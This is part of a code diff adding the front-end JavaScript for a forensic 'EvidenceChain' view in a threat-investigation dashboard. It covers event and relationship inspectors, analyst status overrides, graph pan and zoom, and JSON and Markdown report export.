+            if (!evt) return;
+
+            let statusColor = "#00e676";
+            if (evt.status === "suspected") statusColor = "#f59e0b";
+            if (evt.status === "unverified") statusColor = "#c084fc";
+            if (evt.status === "disputed") statusColor = "#ff2d55";
+
+            body.innerHTML = `
+                <!-- Title & Status Header -->
+                <div class="ev-detail-group">
+                    <div class="ev-detail-header-row">
+                        <span class="ev-detail-label">EVENT NODE • ${evt.stage.toUpperCase()}</span>
+                        <span class="ev-badge-chip" style="background:${statusColor}22; color:${statusColor}; border:1px solid ${statusColor}66;">
+                            ${evt.status.toUpperCase()}
+                        </span>
+                    </div>
+                    <h3 class="ev-detail-title">${evt.title}</h3>
+                </div>
+
+                <!-- Meta Matrix -->
+                <div class="ev-detail-meta-grid">
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">EVENT ID</span>
+                        <span class="ev-meta-val" style="color:var(--gold-bright);">${evt.id}</span>
+                    </div>
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">MITRE ATT&CK</span>
+                        <span class="ev-meta-val">${evt.mitre} (${evt.mitreName})</span>
+                    </div>
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">TARGET ASSET</span>
+                        <span class="ev-meta-val">${evt.asset}</span>
+                    </div>
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">TIMESTAMP</span>
+                        <span class="ev-meta-val">${evt.timestamp}</span>
+                    </div>
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">USER CONTEXT</span>
+                        <span class="ev-meta-val">${evt.user}</span>
+                    </div>
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">TELEMETRY SENSOR</span>
+                        <span class="ev-meta-val">${evt.telemetry}</span>
+                    </div>
+                </div>
+
+                <!-- Telemetry Health Alert if Warning -->
+                ${evt.telemetryHealth === 'warning' ? `
+                    <div class="ev-telemetry-warning-box">
+                        <div class="ev-warning-left">
+                            <span class="ev-warning-icon">⚠️</span>
+                            <div class="ev-warning-text">
+                                <strong>Telemetry Anomaly Flagged:</strong> Sensor dropped frames or audit log was delayed during this execution window.
+                            </div>
+                        </div>
+                    </div>
+                ` : ''}
+
+                <!-- Required Evidence Checklist -->
+                <div class="ev-detail-group">
+                    <div class="ev-detail-header-row">
+                        <span class="ev-detail-label">REQUIRED EVIDENCE CHECKLIST</span>
+                        <span style="font-family:var(--font-mono); font-size:10px; color:var(--text-secondary);">
+                            ${evt.requiredEvidence.filter(i => i.status === 'present').length}/${evt.requiredEvidence.length} VERIFIED
+                        </span>
+                    </div>
+                    <div class="ev-checklist">
+                        ${evt.requiredEvidence.map(item => `
+                            <div class="ev-check-item">
+                                <span class="${item.status === 'present' ? 'ev-check-icon--present' : 'ev-check-icon--missing'}">
+                                    ${item.status === 'present' ? '✓' : '✗'}
+                                </span>
+                                <div class="ev-check-text">
+                                    <strong>${item.name}</strong>
+                                    <div style="font-size:10px; color:var(--text-tertiary); margin-top:2px;">${item.note}</div>
+                                </div>
+                                <span class="ev-check-badge ${item.status === 'present' ? 'ev-check-badge--present' : 'ev-check-badge--missing'}">
+                                    ${item.status.toUpperCase()}
+                                </span>
+                            </div>
+                        `).join('')}
+                    </div>
+                </div>
+
+                <!-- Raw Log Snippet -->
+                <div class="ev-detail-group">
+                    <span class="ev-detail-label">RAW TELEMETRY AUDIT LOG</span>
+                    <pre class="ev-code-box"><code>${escapeHtml(evt.rawSnippet)}</code></pre>
+                </div>
+
+                <!-- Analyst Briefing Notes -->
+                <div class="ev-detail-group">
+                    <span class="ev-detail-label">ANALYST ASSESSMENT NOTES</span>
+                    <div style="font-size:12px; color:var(--text-secondary); background:rgba(5,7,15,0.6); padding:8px 12px; border-radius:4px; border:1px solid var(--border-subtle);">
+                        ${evt.notes}
+                    </div>
+                </div>
+            `;
+        } else if (activeInspectorTab === "evidence") {
+            const rel = investigation.relationships.find(r => r.id === selectedRelationshipId) || investigation.relationships[0];
+            if (!rel) return;
+
+            const src = investigation.events.find(e => e.id === rel.source);
+            const tgt = investigation.events.find(e => e.id === rel.target);
+
+            body.innerHTML = `
+                <div class="ev-detail-group">
+                    <div class="ev-detail-header-row">
+                        <span class="ev-detail-label">RELATIONSHIP INSPECTOR</span>
+                        <span class="ev-badge-chip ev-chip--gold">${rel.ruleId}</span>
+                    </div>
+                    <h3 class="ev-detail-title">${rel.label} (${src ? src.id : ''} → ${tgt ? tgt.id : ''})</h3>
+                </div>
+
+                <!-- Meta Matrix -->
+                <div class="ev-detail-meta-grid">
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">CORRELATION RULE</span>
+                        <span class="ev-meta-val" style="color:var(--gold-bright);">${rel.ruleName}</span>
+                    </div>
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">CONFIDENCE SCORE</span>
+                        <span class="ev-meta-val" style="color:#00e676; font-size:13px; font-weight:700;">${rel.confidence}%</span>
+                    </div>
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">VERIFICATION STATE</span>
+                        <span class="ev-meta-val" style="text-transform:uppercase;">${rel.verification}</span>
+                    </div>
+                    <div class="ev-meta-item">
+                        <span class="ev-meta-key">TEMPORAL DELTA</span>
+                        <span class="ev-meta-val">${rel.timeDelta}</span>
+                    </div>
+                </div>
+
+                <!-- Rationale Box -->
+                <div class="ev-explanation-card">
+                    <div class="ev-explanation-title">
+                        <span>⚡</span>
+                        <span>WHY ARE THESE TWO EVENTS CORRELATED?</span>
+                    </div>
+                    <div class="ev-explanation-body">
+                        ${rel.explanation}
+                    </div>
+                </div>
+
+                <!-- Supporting Artifacts -->
+                <div class="ev-detail-group">
+                    <span class="ev-detail-label">SUPPORTING TELEMETRY ARTIFACTS</span>
+                    <div class="ev-checklist">
+                        ${rel.artifacts.map(art => `
+                            <div class="ev-check-item">
+                                <span class="ev-check-icon--present">✓</span>
+                                <span class="ev-check-text">${art}</span>
+                            </div>
+                        `).join('')}
+                    </div>
+                </div>
+            `;
+        } else if (activeInspectorTab === "correction") {
+            const evt = investigation.events.find(e => e.id === selectedEventId) || investigation.events[0];
+            if (!evt) return;
+
+            body.innerHTML = `
+                <div class="ev-detail-group">
+                    <div class="ev-detail-header-row">
+                        <span class="ev-detail-label">EVENT CORRECTION & HYPOTHESIS RE-EVALUATION</span>
+                        <span class="ev-badge-chip ev-chip--gold">${evt.id}</span>
+                    </div>
+                    <h3 class="ev-detail-title">Modify Event Status: ${evt.title}</h3>
+                </div>
+
+                <div class="ev-correction-box">
+                    <span class="ev-correction-title">
+                        <span>🛡️</span>
+                        <span>ANALYST STATUS OVERRIDE</span>
+                    </span>
+                    <p style="font-size:11.5px; color:var(--text-secondary); line-height:1.4;">
+                        Select a revised status for this event. Changing to <strong>Disputed</strong> or <strong>Unverified</strong> will automatically re-evaluate all dependent kill chain relationships and completeness calculations.
+                    </p>
+
+                    <div class="ev-status-picker-group">
+                        <button type="button" class="ev-status-opt-btn ${evt.status === 'confirmed' ? 'ev-opt--active' : ''}" data-status="confirmed">
+                            ✓ Confirmed
+                        </button>
+                        <button type="button" class="ev-status-opt-btn ${evt.status === 'suspected' ? 'ev-opt--active' : ''}" data-status="suspected">
+                            ? Suspected
+                        </button>
+                        <button type="button" class="ev-status-opt-btn ${evt.status === 'unverified' ? 'ev-opt--active' : ''}" data-status="unverified">
+                            ~ Unverified
+                        </button>
+                        <button type="button" class="ev-status-opt-btn ${evt.status === 'disputed' ? 'ev-opt--active' : ''}" data-status="disputed">
+                            ✕ Disputed
+                        </button>
+                    </div>
+
+                    <label class="ev-detail-label" style="margin-top:6px;" for="ev-analyst-notes-input">Analyst Reasoning Note</label>
+                    <textarea class="ev-notes-textarea" id="ev-analyst-notes-input" placeholder="Document reason for status transition or forensic correction…">${evt.notes || ''}</textarea>
+
+                    <button type="button" class="ev-reevaluate-btn" id="ev-btn-apply-reevaluate">
+                        <span>⚡</span>
+                        <span>Commit & Re-evaluate Evidence Chain</span>
+                    </button>
+                </div>
+
+                <div class="ev-detail-group">
+                    <span class="ev-detail-label">RECENT CORRECTION AUDIT TRAIL</span>
+                    <div class="ev-audit-list" id="ev-inspector-audit-list">
+                        ${investigation.auditTrail.map(item => `
+                            <div class="ev-audit-item">
+                                <span class="ev-audit-time">${item.time}</span>
+                                <span>${item.text}</span>
+                            </div>
+                        `).join('')}
+                    </div>
+                </div>
+            `;
+
+            // Bind status picker buttons
+            const statusBtns = body.querySelectorAll('.ev-status-opt-btn');
+            statusBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    statusBtns.forEach(b => b.classList.remove('ev-opt--active'));
+                    btn.classList.add('ev-opt--active');
+                });
+            });
+
+            // Bind Re-evaluate button
+            const applyBtn = document.getElementById('ev-btn-apply-reevaluate');
+            if (applyBtn) {
+                applyBtn.addEventListener('click', () => {
+                    const activeBtn = body.querySelector('.ev-status-opt-btn.ev-opt--active');
+                    const note = document.getElementById('ev-analyst-notes-input').value;
+                    if (activeBtn) {
+                        const newStatus = activeBtn.getAttribute('data-status');
+                        evt.status = newStatus;
+                        evt.notes = note;
+                        reevaluateEvidenceChain();
+                    }
+                });
+            }
+        }
+    }
+
+    function renderCompletenessBar() {
+        const stats = calculateEvidenceCompleteness();
+        const fill = document.getElementById('ev-completeness-fill');
+        const num = document.getElementById('ev-completeness-num');
+        const sub = document.getElementById('ev-completeness-sub');
+
+        if (fill) fill.style.width = `${stats.percent}%`;
+        if (num) num.textContent = `${stats.percent}%`;
+        if (sub) sub.textContent = `${stats.present}/${stats.total} Evidence Points Verified`;
+
+        // Update top confirmed count
+        const confirmedCount = investigation.events.filter(e => e.status === 'confirmed').length;
+        const confNum = document.getElementById('ev-stat-confirmed-num');
+        if (confNum) confNum.textContent = `${confirmedCount}/${investigation.events.length}`;
+    }
+
+    function renderAuditTrail() {
+        const list = document.getElementById('ev-inspector-audit-list');
+        if (!list) return;
+        list.innerHTML = investigation.auditTrail.map(item => `
+            <div class="ev-audit-item">
+                <span class="ev-audit-time">${item.time}</span>
+                <span>${item.text}</span>
+            </div>
+        `).join('');
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // 6. SVG INTERACTION (PAN, ZOOM, DRAG, CLICK)
+    // ═══════════════════════════════════════════════════════════
+
+    function bindSvgEvents() {
+        const svg = document.getElementById('ev-graph-svg');
+        if (!svg) return;
+
+        // Node click
+        svg.querySelectorAll('.ev-node-group').forEach(node => {
+            node.addEventListener('click', (e) => {
+                e.stopPropagation();
+                const nodeId = node.getAttribute('data-node-id');
+                selectedEventId = nodeId;
+                selectedRelationshipId = null;
+                activeInspectorTab = "event";
+                updateInspectorTabs();
+                renderGraph();
+                renderInspector();
+            });
+        });
+
+        // Edge / relationship click
+        svg.querySelectorAll('.ev-edge-path, .ev-edge-label-group').forEach(elem => {
+            elem.addEventListener('click', (e) => {
+                e.stopPropagation();
+                const relId = elem.getAttribute('data-rel-id');
+                selectedRelationshipId = relId;
+                selectedEventId = null;
+                activeInspectorTab = "evidence";
+                updateInspectorTabs();
+                renderGraph();
+                renderInspector();
+            });
+        });
+    }
+
+    function initPanZoom() {
+        const viewport = document.getElementById('ev-graph-viewport');
+        if (!viewport) return;
+
+        viewport.addEventListener('mousedown', (e) => {
+            if (e.target.closest('.ev-node-group') || e.target.closest('.ev-edge-path') || e.target.closest('.ev-edge-label-group')) {
+                return;
+            }
+            isPanning = true;
+            panStart = { x: e.clientX - transform.x, y: e.clientY - transform.y };
+        });
+
+        window.addEventListener('mousemove', (e) => {
+            if (!isPanning) return;
+            transform.x = e.clientX - panStart.x;
+            transform.y = e.clientY - panStart.y;
+            renderGraph();
+        });
+
+        window.addEventListener('mouseup', () => { isPanning = false; });
+
+        // Wheel zoom
+        viewport.addEventListener('wheel', (e) => {
+            e.preventDefault();
+            const delta = e.deltaY < 0 ? 1.1 : 0.9;
+            transform.k = Math.max(0.4, Math.min(2.5, transform.k * delta));
+            renderGraph();
+        }, { passive: false });
+
+        // Zoom buttons
+        const btnZoomIn = document.getElementById('ev-zoom-in');
+        const btnZoomOut = document.getElementById('ev-zoom-out');
+        const btnReset = document.getElementById('ev-zoom-reset');
+
+        if (btnZoomIn) btnZoomIn.addEventListener('click', () => {
+            transform.k = Math.min(2.5, transform.k * 1.15);
+            renderGraph();
+        });
+        if (btnZoomOut) btnZoomOut.addEventListener('click', () => {
+            transform.k = Math.max(0.4, transform.k * 0.85);
+            renderGraph();
+        });
+        if (btnReset) btnReset.addEventListener('click', () => {
+            transform = { x: 40, y: 30, k: 1 };
+            selectedEventId = "EVT-104";
+            selectedRelationshipId = null;
+            searchQuery = "";
+            statusFilter = "all";
+            const searchInput = document.getElementById('ev-search-input');
+            const filterSelect = document.getElementById('ev-status-filter');
+            if (searchInput) searchInput.value = "";
+            if (filterSelect) filterSelect.value = "all";
+            renderGraph();
+            renderInspector();
+        });
+    }
+
+    function updateInspectorTabs() {
+        document.querySelectorAll('.ev-inspector-tab').forEach(tab => {
+            if (tab.getAttribute('data-tab') === activeInspectorTab) {
+                tab.classList.add('ev-tab--active');
+            } else {
+                tab.classList.remove('ev-tab--active');
+            }
+        });
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // 7. EXPORT ENGINE (JSON & MARKDOWN DOSSIERS)
+    // ═══════════════════════════════════════════════════════════
+
+    function generateJsonExport() {
+        const payload = {
+            investigation: investigation.id,
+            title: investigation.title,
+            exportedAt: new Date().toISOString(),
+            classification: investigation.classification,
+            leadAnalyst: investigation.leadAnalyst,
+            completenessMetric: calculateEvidenceCompleteness(),
+            events: investigation.events,
+            relationships: investigation.relationships,
+            auditTrail: investigation.auditTrail
+        };
+        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `${investigation.id}_EvidenceChain_Dossier.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+    }
+
+    function generateMarkdownExport() {
+        const stats = calculateEvidenceCompleteness();
+        let md = `# THREAT STORM — FORENSIC EVIDENCECHAIN™ REPORT\n\n`;
+        md += `**Investigation ID:** ${investigation.id}\n`;
+        md += `**Title:** ${investigation.title}\n`;
+        md += `**Classification:** ${investigation.classification}\n`;
+        md += `**Lead Analyst:** ${investigation.leadAnalyst}\n`;
+        md += `**Export Date:** ${new Date().toUTCString()}\n`;
+        md += `**Evidence Completeness:** ${stats.percent}% (${stats.present}/${stats.total} required artifacts)\n\n`;
+        md += `---\n\n`;
+        md += `## 1. Executive Summary\n`;
+        md += `Advanced persistent threat correlation observed a multi-stage attack compromising internal assets from Initial Access to TLS C2 Exfiltration.\n\n`;
+        md += `## 2. Telemetry Anomaly Warnings\n`;
+        investigation.telemetryWarnings.forEach(w => {
+            md += `- **[${w.id}] ${w.title}:** ${w.message} (Sensor: ${w.sensor})\n`;
+        });
+        md += `\n## 3. Kill Chain Event Sequence\n\n`;
+        investigation.events.forEach(e => {
+            md += `### ${e.id}: ${e.title} [Status: ${e.status.toUpperCase()}]\n`;
+            md += `- **MITRE Technique:** ${e.mitre} (${e.mitreName})\n`;
+            md += `- **Asset & User:** ${e.asset} (${e.user})\n`;
+            md += `- **Timestamp:** ${e.timestamp}\n`;
+            md += `- **Process:** \`${e.process}\`\n`;
+            md += `- **Evidence Items:**\n`;
+            e.requiredEvidence.forEach(req => {
+                md += `  - [${req.status === 'present' ? 'X' : ' '}] ${req.name}: ${req.note}\n`;
+            });
+            md += `\n`;
+        });
+        md += `## 4. Explicit Correlation Rules & Links\n\n`;
+        investigation.relationships.forEach(r => {
+            md += `- **${r.id} (${r.source} → ${r.target}):** Rule ${r.ruleId} (*${r.ruleName}*) — Confidence: ${r.confidence}%\n`;
+            md += `  *Explanation:* ${r.explanation}\n`;
+        });
+        md += `\n## 5. Investigation Audit Trail\n\n`;
+        investigation.auditTrail.forEach(a => {
+            md += `- \`${a.time}\`: ${a.text}\n`;
+        });
+
+        const blob = new Blob([md], { type: 'text/markdown' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `${investigation.id}_Incident_Briefing.md`;
+        a.click();
+        URL.revokeObjectURL(url);
+    }
+
+    function openExportModal() {
+        const modal = document.getElementById('ev-export-modal');
+        if (!modal) return;
+        modal.classList.add('ev-modal--open');
+
+        const stats = calculateEvidenceCompleteness();
+        const content = document.getElementById('ev-modal-preview-content');
+        if (content) {
+            content.innerHTML = `
+                <div style="background:rgba(5,7,15,0.8); border:1px solid var(--border-subtle); border-radius:6px; padding:16px;">
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+                        <div>
+                            <span style="font-family:var(--font-mono); font-size:10px; color:var(--gold-bright);">INCIDENT DOSSIER</span>
+                            <h4 style="font-family:var(--font-heading); font-size:16px; color:#ffffff; margin-top:2px;">${investigation.title}</h4>
+                        </div>
+                        <span class="ev-badge-chip ev-chip--crit">CVSS 9.8</span>
+                    </div>
+                    <p style="font-size:12px; color:var(--text-secondary); line-height:1.5;">
+                        This briefing contains verified telemetry, explicit correlation rationale across 8 kill chain nodes, and completeness scoring.
+                    </p>
+                    <div style="margin-top:12px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px;">
+                        <div style="background:#020409; padding:8px 10px; border-radius:4px;">
+                            <span style="font-size:9.5px; color:var(--text-tertiary); font-family:var(--font-mono);">EVENTS</span>
+                            <div style="font-size:15px; font-weight:700; color:#ffffff;">${investigation.events.length} Nodes</div>
+                        </div>
+                        <div style="background:#020409; padding:8px 10px; border-radius:4px;">
+                            <span style="font-size:9.5px; color:var(--text-tertiary); font-family:var(--font-mono);">CORRELATIONS</span>
+                            <div style="font-size:15px; font-weight:700; color:#38bdf8;">${investigation.relationships.length} Edges</div>
+                        </div>
+                        <div style="background:#020409; padding:8px 10px; border-radius:4px;">
+                            <span style="font-size:9.5px; color:var(--text-tertiary); font-family:var(--font-mono);">COMPLETENESS</span>
+                            <div style="font-size:15px; font-weight:700; color:#00e676;">${stats.percent}%</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+    }
+
+    function closeExportModal() {
+        const modal = document.getElementById('ev-export-modal');
+        if (modal) modal.classList.remove('ev-modal--open');
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // 8. ROUTING & VIEW SWITCHING (SAFE ISOLATED INTEGRATION)
+    // ═══════════════════════════════════════════════════════════
+
+    function switchToEvidenceChainView() {
+        // Hide standard dashboard overview sections
+        const hero = document.getElementById('hero-section');
+        const middle = document.getElementById('middle-dashboard');
+        const recent = document.getElementById('recent-threats-section');
+        const evSection = document.getElementById('evidence-chain');
+
+        if (hero) hero.style.display = 'none';
+        if (middle) middle.style.display = 'none';
+        if (recent) recent.style.display = 'none';
+        if (evSection) {
+            evSection.classList.add('ev-view--active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Update active sidebar nav
+        document.querySelectorAll('.sidebar__nav .nav-item').forEach(item => {
+            item.classList.remove('nav-item--active');
+        });
+        const evNavItem = document.getElementById('menu-evidence-chain');
+        if (evNavItem) evNavItem.classList.add('nav-item--active');
+
+        // Update active top tab
+        document.querySelectorAll('.tab-pill').forEach(pill => pill.classList.remove('tab-pill--active'));
+        const evTab = document.getElementById('tab-evidence-chain');
+        if (evTab) evTab.classList.add('tab-pill--active');
+
+        renderCompletenessBar();
+        renderGraph();
+        renderInspector();
+    }
+
+    function switchToDashboardView(targetHash) {
+        const hero = document.getElementById('hero-section');
+        const middle = document.getElementById('middle-dashboard');
+        const recent = document.getElementById('recent-threats-section');
+        const evSection = document.getElementById('evidence-chain');
+
+        if (hero) hero.style.display = '';
+        if (middle) middle.style.display = '';
+        if (recent) recent.style.display = '';
+        if (evSection) evSection.classList.remove('ev-view--active');
+
+        // Scroll to target element if present
+        if (targetHash && targetHash !== '#' && targetHash !== '#hero-section') {
+            const targetEl = document.querySelector(targetHash);
+            if (targetEl) targetEl.scrollIntoView({ behavior: 'smooth' });
+        }
+    }
+
+    function handleHashChange() {
+        const hash = window.location.hash;
+        if (hash === '#evidence-chain' || hash === '#evidencechain') {
+            switchToEvidenceChainView();
+        } else {
+            switchToDashboardView(hash);
+        }
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/&/g, '&amp;')
+                  .replace(/</g, '&lt;')
+                  .replace(/>/g, '&gt;')
+                  .replace(/"/g, '&quot;')
+                  .replace(/'/g, '&#039;');
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // 9. INITIALIZATION
+    // ═══════════════════════════════════════════════════════════
+
+    function init() {
+        window.addEventListener('hashchange', handleHashChange);
+
+        // Sidebar click on EvidenceChain
+        const menuEv = document.getElementById('menu-evidence-chain');
+        if (menuEv) {
+            menuEv.addEventListener('click', (e) => {
+                e.preventDefault();
+                window.location.hash = 'evidence-chain';
+                switchToEvidenceChainView();
+            });
+        }
+
+        // Top tab click on EvidenceChain
+        const tabEv = document.getElementById('tab-evidence-chain');
+        if (tabEv) {
+            tabEv.addEventListener('click', () => {
+                window.location.hash = 'evidence-chain';
+                switchToEvidenceChainView();
+            });
+        }
+
+        // When user clicks other sidebar items, return to dashboard view smoothly
+        document.querySelectorAll('.sidebar__nav .nav-item').forEach(item => {
+            if (item.id !== 'menu-evidence-chain') {
+                item.addEventListener('click', () => {
+                    const href = item.getAttribute('href');
+                    switchToDashboardView(href);
+                    document.querySelectorAll('.sidebar__nav .nav-item').forEach(i => i.classList.remove('nav-item--active'));
+                    item.classList.add('nav-item--active');
+                });
+            }
+        });
+
+        // Inspector tabs switching
+        document.querySelectorAll('.ev-inspector-tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                activeInspectorTab = tab.getAttribute('data-tab');
+                updateInspectorTabs();
+                renderInspector();
+            });
+        });
+
+        // Search bar
+        const searchInput = document.getElementById('ev-search-input');
+        if (searchInput) {
+            searchInput.addEventListener('input', (e) => {
+                searchQuery = e.target.value.trim();
+                renderGraph();
+            });
+        }
+
+        // Status Filter dropdown
+        const statusFilterSelect = document.getElementById('ev-status-filter');
+        if (statusFilterSelect) {
+            statusFilterSelect.addEventListener('change', (e) => {
+                statusFilter = e.target.value;
+                renderGraph();
+            });
+        }
+
+        // Export Buttons
+        const btnExportJson = document.getElementById('ev-btn-export-json');
+        const btnExportMd = document.getElementById('ev-btn-export-md');
+        const btnOpenExportModal = document.getElementById('ev-btn-open-export');
+        const btnCloseModal = document.getElementById('ev-modal-close');
+        const modalOverlay = document.getElementById('ev-export-modal');
+
+        if (btnExportJson) btnExportJson.addEventListener('click', generateJsonExport);
+        if (btnExportMd) btnExportMd.addEventListener('click', generateMarkdownExport);
+        if (btnOpenExportModal) btnOpenExportModal.addEventListener('click', openExportModal);
+        if (btnCloseModal) btnCloseModal.addEventListener('click', closeExportModal);
+        if (modalOverlay) {
+            modalOverlay.addEventListener('click', (e) => {
+                if (e.target === modalOverlay) closeExportModal();
+            });
+        }
+
+        initPanZoom();
+
+        // Initial check for hash
+        if (window.location.hash === '#evidence-chain' || window.location.hash === '#evidencechain') {
+            switchToEvidenceChainView();
+        }
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
+
+    // Expose for debugging & testing
+    window.EvidenceChainEngine = {
+        getInvestigation: () => investigation,
+        reevaluate: reevaluateEvidenceChain,
+        selectEvent: (id) => { selectedEventId = id; renderGraph(); renderInspector(); },
+        selectRelationship: (id) => { selectedRelationshipId = id; renderGraph(); renderInspector(); },
+        exportJson: generateJsonExport,
+        exportMd: generateMarkdownExport,
+        switchToEvidenceChainView,
+        switchToDashboardView
+    };
+
+})();
